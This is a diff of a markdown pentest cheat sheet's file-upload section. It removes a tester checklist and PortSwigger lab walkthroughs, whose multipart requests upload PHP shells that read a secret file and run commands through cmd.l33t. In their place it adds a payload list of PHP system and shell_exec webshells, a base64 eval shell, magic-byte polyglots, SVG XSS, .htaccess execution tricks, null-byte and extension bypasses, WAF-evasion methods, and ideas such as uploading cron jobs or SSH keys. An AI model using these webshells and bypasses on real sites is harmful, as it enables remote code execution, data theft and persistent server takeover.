@@ -2273,376 +2273,207 @@ For example in Git, the exploitation technique doesn't require to list the conte
 - [Fuxploider](https://github.com/almandin/fuxploider)
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
 
-### Methods:
-1. **Simple File Upload**
-   - Upload `c99.php` or `dhanush.php` for execution.
-   - Use `nc.exe` for a reverse shell (Windows).
-2. **Content-Type Bypass**
-   - Modify the `Content-Type` header in Burp Suite.
-   - Example: Change `text/php` to `image/jpeg`.
-3. **Extension Verification Bypass**
-   - Use double extensions (`shell.php.jpg`).
+# 🔹 Basic File Upload Payloads
 
-**1. Extension Filter Bypass**  
-Upload executable file with double or spoofed extension.
+* Simple PHP shell:
+  php
+  <?php system($_GET['cmd']); ?>
+    → Executes system commands via uploaded file.
+* Basic webshell:
+  php
+  <?php echo shell_exec($_GET['cmd']); ?>
+  
+* HTML file upload: <h1>Injected</h1>
+* SVG upload (XSS):
+  xml
+  <svg><script>alert(1)</script></svg>
+  
+# 🔹 Common Malicious File Types
 
-`filename`  
-```text
-shell.php.jpg
-shell.jpg.php
-shell.pHp
+* PHP shell: shell.php
+* ASP shell:  shell.asp
+* JSP shell: shell.jsp
+* Python shell:shell.py
+* Executable file: shell.exe
+
+# 🔹 Double Extension Bypass
+
+* Double extension:  shell.php.jpg
+* Multiple extensions: shell.php.png.jpg
+* Reverse order: shell.jpg.php
+* Hidden extension: shell.php;.jpg
+* Mixed case: shell.pHp
+
+# 🔹 Null Byte Injection (Legacy)
+
+* Null byte trick:  shell.php%00.jpg
+* Combined: shell.php%00.png
+* Traversal + null: ../../shell.php%00.jpg
+
+# 🔹 MIME Type Bypass
+
+* Fake content type:  Content-Type: image/jpeg (while uploading PHP)
+* Multiple MIME:  Content-Type: image/jpeg, application/php
+* Null MIME:   Content-Type: application/octet-stream
+* Missing MIME header:  Remove Content-Type
+
+# 🔹 Magic Byte / Signature Bypass
+
+* JPEG magic bytes:
+  php
+  \xFF\xD8\xFF<?php system($_GET['cmd']); ?>
+  
+* PNG magic bytes:
+  php
+  \x89PNG<?php system($_GET['cmd']); ?>
+  
+* GIF header:
+  php
+  GIF89a<?php system($_GET['cmd']); ?>
+  
+
+# 🔹 File Content Obfuscation
+
+* Base64 payload:
+  php
+  <?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); ?>
+  
+* Hex encoded:
+  php
+  <?php system("\x69\x64"); ?>
+  
+* Split payload:\
+  <?ph + p system($_GET['cmd']); ?>
+
+# 🔹 Image + Shell Polyglots
+
+* JPG + PHP:
+  php
+  <?php system($_GET['cmd']); ?> (inside image)
+  
+* SVG polyglot:\
+  Combines XML + JS + HTML
+* ZIP + PHP polyglot:\
+  Upload valid archive containing shell
+
+# 🔹 File Path Manipulation
+
+* Directory traversal:  ../../shell.php
+* Absolute overwrite:  /var/www/html/shell.php
+* Hidden files:  .htaccess
+* Temp file override:  /tmp/shell.php
+
+# 🔹 .htaccess Injection
+
+* Force PHP execution:
+  
+  AddType application/x-httpd-php .jpg
+  
+* Execute inside image:\
+  Rename .jpg → runs as PHP
+
+# 🔹 Upload + LFI Combo
+
+* Upload shell → include via LFI:  /uploads/shell.jpg
+* Temp file inclusion:  /tmp/phpXXXX
+* Session file injection:  /var/lib/php/sessions/sess_id
+
+# 🔹 Advanced Upload Exploitation
+
+* Overwrite config file:  .htaccess or .env
+* Overwrite existing file:  index.php
+* Upload cron job:  /etc/cron.d/shell
+* Upload SSH key:  authorized_keys
+
+# 🔹 WAF Bypass Techniques (File Upload)
+## 🧩 Extension Obfuscation
+
+* Mixed case: shell.pHp
+* Unicode extension:  shell.ph\u0070
+* Trailing dot:  shell.php.
+* Space bypass:  shell.php 
+
+## 🧩 Encoding Tricks
+
+* URL encoding:  shell%2ephp
+* Double encoding:  shell%252ephp
+* Null byte encoding:  %00
+
+## 🧩 Content-Type Tricks
+
+* Fake header:  Content-Type: image/jpeg
+* Multiple headers:  Duplicate Content-Type fields
+* Boundary manipulation:  Modify multipart boundaries
+
+## 🧩 Filename Bypass
+
+* Random filename:  random123.php
+* Long filename:  aaaaaaaaaaaaaaaaaaaa.php
+* Special characters:  shell.php#.jpg
+
+## 🧩 File Structure Tricks
+
+* Add padding:  Large file with payload inside
+* Comment injection:  Hide payload in comments
+* Archive wrapping:  Upload ZIP containing shell
+
+# 🔹 Brute Force Upload Payload List
+## ✅ Extensions to Try
 ```
-
-✅ Expected: Extension validated strictly  
-❌ Vulnerable: Executable file accepted
-
----
-
-**2. MIME Type Bypass**  
-Spoof `Content-Type` header to bypass validation.
-
-`http`  
-Header:  
-```http
-Content-Type: image/png
+.php
+.php3
+.php4
+.php5
+.phtml
+.phar
+.asp
+.aspx
+.jsp
+.jspx
+.py
+.cgi
+.pl
+.sh
 ```
-
-✅ Expected: MIME type verified server-side  
-❌ Vulnerable: File accepted based on header alone
-
----
-
-**3. Magic Bytes Bypass**  
-Embed shell after valid image header.
-
-`bash`  
-```bash
-echo "<?php system($_GET['cmd']); ?>" >> image.png
+## ✅ Double Extensions
 ```
-
-✅ Expected: File scanned for actual content  
-❌ Vulnerable: Shell executed despite image header
-
----
-
-**4. Content-Disposition Manipulation**  
-Inject malicious filename via multipart upload.
-
-`http`  
-Header:  
-```http
-Content-Disposition: form-data; name="file"; filename="shell.php"
+.php.jpg
+.php.png
+.php.gif
+.jpg.php
+.png.php
 ```
-
-✅ Expected: Filename sanitized  
-❌ Vulnerable: Executable file saved
-
----
-
-**5. NTFS ADS Bypass (Windows)**  
-Use alternate data stream to hide payload.
-
-`filename`  
-```text
-shell.asp:.jpg
-shell.asp::$data
+## ✅ Obfuscated Extensions
 ```
-
-✅ Expected: ADS rejected or ignored  
-❌ Vulnerable: Payload executed via ADS
-
----
-
-**6. Filename Length Truncation**  
-Exploit filename length limits to hide extension.
-
-`filename`  
-```text
-A...A.php.png (255 bytes total)
+.pHp
+.phtml
+.phP5
+.php.
+.php%00.jpg
 ```
-
-✅ Expected: Full filename validated  
-❌ Vulnerable: Executable extension preserved
-
----
-
-**7. Image Metadata Injection**  
-Embed shell in EXIF metadata.
-
-`bash`  
-```bash
-exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg
+## ✅ File Names
 ```
-
-✅ Expected: Metadata stripped or ignored  
-❌ Vulnerable: Shell executed from metadata
-
----
-
-**8. Compression Bypass**  
-Upload compressed image with embedded shell.
-
-✅ Expected: File decompressed and scanned  
-❌ Vulnerable: Shell survives compression
-
----
-
-**9. Resizing Bypass**  
-Upload image with shell in non-resized chunk (e.g. PLTE).
-
-✅ Expected: Image resized securely  
-❌ Vulnerable: Shell chunk preserved
-
----
-
-**10. File Path Traversal via Filename**  
-Inject traversal sequences in filename.
-
-`filename`  
-```text
-../../../../var/www/html/shell.php
+shell.php
+cmd.php
+test.php
+upload.php
+backdoor.php
 ```
-
-✅ Expected: Path sanitized  
-❌ Vulnerable: File written outside intended directory
-
----
-
-**11. Client-Side Validation Only**  
-Rely on JavaScript to block `.php` uploads.
-
-✅ Expected: Server-side validation enforced  
-❌ Vulnerable: JS bypassed, file accepted
-
----
-
-**12. Upload Location Disclosure**  
-Server reveals upload path in response.
-
-✅ Expected: Generic success message  
-❌ Vulnerable: Full path disclosed
-
----
-
-**13. HTML/JS Upload for XSS**  
-Upload `.html` or `.js` file with script payload.
-
-`html`  
-```html
-<script>alert('XSS')</script>
+## ✅ MIME Variations
 ```
-
-✅ Expected: File served as download or blocked  
-❌ Vulnerable: Script executed in browser
-
----
-
-**14. SVG Upload with JavaScript**  
-Embed JS in SVG file.
-
-`svg`  
-```xml
-<svg><script>alert('XSS')</script></svg>
+image/jpeg
+image/png
+application/octet-stream
+text/plain
+multipart/form-data
 ```
-
-✅ Expected: SVG sanitized or blocked  
-❌ Vulnerable: JS executed on render
-
----
-
-**15. Polyglot File Upload**  
-Merge shell with valid file format (e.g. JPEG + PHP).
-
-✅ Expected: File parsed strictly  
-❌ Vulnerable: Executable code triggered
-
-### Tool:
-- [FuzzDB Malicious Images](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/malicious-images)
-
-
-```
-POST /my-account/avatar HTTP/2
-...
------------------------------372082654728426116931381616293
-Content-Disposition: form-data; name="avatar"; filename="test.php"
-Content-Type: text/php
-
-<?php echo file_get_contents('/home/carlos/secret'); ?>
------------------------------372082654728426116931381616293
-...
-```
-![image](https://github.com/user-attachments/assets/9d64d730-dd3d-4309-a589-97f08634ebd2)
-
-Now you can read the value of the file ("G5Bm58gT0NzAmOPLxpe0vR82y4CNT6WY") accessing /avatars/test.php:
-![image](https://github.com/user-attachments/assets/c8f1a76d-9fe6-4800-8483-64fd7fe2eaac)
-
-2. Web shell upload via Content-Type restriction bypass
-
-This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
-If we try the same payload as the previous lab there is an error:
-
-![image](https://github.com/user-attachments/assets/8b2d8cb9-4f01-4c0f-a672-e34e92b1076c)
-
-Changing the Content-Type it is possible to upload the PHP file:
-
-![image](https://github.com/user-attachments/assets/72addbcb-19e8-42de-80d2-2d0f2abccec0)
-
-And read the secret ("wDHZLacPXl2c4B4MZl2j7T3MluCqDzjR"):
-
-![image](https://github.com/user-attachments/assets/0c9ac776-1042-44f0-a09c-7489bede795a)
----
-# Web shell upload via path traversal
-
-This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
-
-It is possible to upload a PHP file:
-
-![image](https://github.com/user-attachments/assets/718e00e3-b216-443f-8ba8-2d1d13306162)
-
-But it does not execute:
-
-![image](https://github.com/user-attachments/assets/f35e355d-e098-4cd7-844a-52907b284450)
-
-To execute the PHP file we will upload it in a different directory using path traversal. We need to encode the payload or it will not work (filename="%2e%2e%2fb.php"):
-
-```
-POST /my-account/avatar HTTP/2
-...
------------------------------40637643122628174081089911774
-Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fb.php"
-Content-Type: text/php
-
-<?php echo file_get_contents('/home/carlos/secret'); ?>
------------------------------40637643122628174081089911774
-...
-```
-![image](https://github.com/user-attachments/assets/cc2fd1f9-6644-42b1-8ca8-7e590d00ca8e)
-
-The files is uploaded to the folder “/files” and not “/files/avatars”:
-
-![image](https://github.com/user-attachments/assets/31501f21-992f-4d8a-a10e-47136bbd571f)
-
-# Web shell upload via extension blacklist bypass
-
-This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
-
-New .htaccess file:
-
-```
------------------------------230880832739977645353483474501
-Content-Disposition: form-data; name="avatar"; filename=".htaccess"
-Content-Type: application/octet-stream
-
-AddType application/x-httpd-php .l33t
-```
-
-![image](https://github.com/user-attachments/assets/d5c28714-b171-48e5-a810-74d2536b9e66)
-![image](https://github.com/user-attachments/assets/c83a070f-68b8-47cc-a1df-d6a04f3d8512)
-
-Upload Phpinfo file:
-
-```
------------------------------230880832739977645353483474501
-Content-Disposition: form-data; name="avatar"; filename="test.l33t"
-Content-Type: application/octet-stream
-
-<?php phpinfo(); ?>
-```
-![image](https://github.com/user-attachments/assets/5e6db857-49a8-4d07-9163-947106d12ca2)
-![image](https://github.com/user-attachments/assets/aa79fc19-eb2b-4d42-8262-e446e80ae7e1)
-
-Upload cmdshell:
-
-```
------------------------------230880832739977645353483474501
-Content-Disposition: form-data; name="avatar"; filename="cmd.l33t"
-Content-Type: application/octet-stream
-
-<?php
-if($_GET['cmd']) {
-  system($_GET['cmd']);
-}
-```
-```
-https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=whoami
-```
-
-![image](https://github.com/user-attachments/assets/69e08b6d-cd26-47c4-a075-cf2b672ee0b0)
-![image](https://github.com/user-attachments/assets/958ac36f-b5cf-4d99-b095-a85c6c3c803b)
-
-Read the file:
-
-```
-https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=cat%20/home/carlos/secret
-```
-MzrfsTWgFr82UcKq9wFC0hObV7YSVmlq
-
-![image](https://github.com/user-attachments/assets/f84d4401-892e-4fe9-b111-35151e73a5b3)
-
-# Remote code execution via polyglot web shell upload
-
-This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
-
-I uploaded a real JPG file and deleted as many bytes as possible. This is the least you can send so the server still finds it is a JPG image:
-
-![image](https://github.com/user-attachments/assets/9229ab37-4a90-4343-aed9-1dd065666047)
-
-So we can change everything to update a PHP file like this:
-
-```
-POST /my-account/avatar HTTP/2
-...
------------------------------223006367629168816071656253944
-Content-Disposition: form-data; name="avatar"; filename="test.php"
-Content-Type: text/php
-
-<--JPG MAGIC NUMBER-->
-
-<?php echo file_get_contents('/home/carlos/secret'); ?>
-
------------------------------223006367629168816071656253944
-...
-```
-![image](https://github.com/user-attachments/assets/6f1a71b9-dc4c-488d-93c6-2d24ce0278b3)
-
-And then access /files/avatars/test.php to read the content of the file:
-
-![image](https://github.com/user-attachments/assets/9b414baa-624c-4434-a32b-130969dc2bfb)
-
-# Web shell upload via obfuscated file extension
-
-This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
-
-It is not possible to upload PHP files:
-
-![image](https://github.com/user-attachments/assets/1c5bb867-e2f8-46da-ac5a-4698225248de)
-
-I tried to upload the file with the names:
-
-- “test.php.jpg” but it is interepreted as an image.
-
-- “test.php.” but it is not accepted
-
-- “test%2Ephp” but it is not accepted
-
-The payload “test.php%00.jpg” uploads a file “test.php”:
-
-```
-POST /my-account/avatar HTTP/2
-...
------------------------------384622689610978532422380962615
-Content-Disposition: form-data; name="avatar"; filename="test.php%00.jpg"
-Content-Type: text/php
-
-<?php echo file_get_contents('/home/carlos/secret'); ?>
------------------------------384622689610978532422380962615
-...
-```
-![image](https://github.com/user-attachments/assets/04ef5e62-4432-4a73-a19e-65e30ebc82c0)
-
-The file test.php has been created:
-
-![image](https://github.com/user-attachments/assets/74844fe3-56bf-4b97-a45a-811ea081d727)
+# 🔹 Real-World Attack Scenarios
+
+* Remote Code Execution → Upload webshell
+* Privilege escalation → Overwrite sensitive files
+* Website defacement → Upload HTML/JS files
+* Data theft → Access server files via shell
+* Full server takeover → Persistent backdoor
 
 ## 15. XML External Entity (XXE) Injection
 
